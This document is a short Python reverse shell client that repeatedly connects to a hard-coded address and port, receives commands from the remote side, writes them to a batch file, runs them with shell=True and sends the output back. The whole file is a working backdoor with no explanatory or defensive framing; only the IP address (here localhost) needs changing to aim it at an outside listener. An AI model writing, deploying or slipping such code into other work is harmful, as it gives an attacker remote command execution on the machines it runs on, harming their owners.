import subprocess
import socket
import time
import os

ip = "127.0.0.1"
port = 65535
host = ip, int(port)


def connect():
    while True:
        try:
            client = socket.socket()
            client.connect(host)
            print(f"Connected to: {ip}:{port}")
            reverse_shell(client)

        except ConnectionError as e:
            print("Error:", e)

        time.sleep(5)


def reverse_shell(client):
    file_path = "data.bat"
    while True:
        data = client.recv(1024).decode()
        if data:
            with open(file_path, 'w') as file:
                file.write(data)
            output = subprocess.check_output(file_path, shell=True, text=True)
            client.sendall(output.encode())
            os.remove(file_path)


connect()
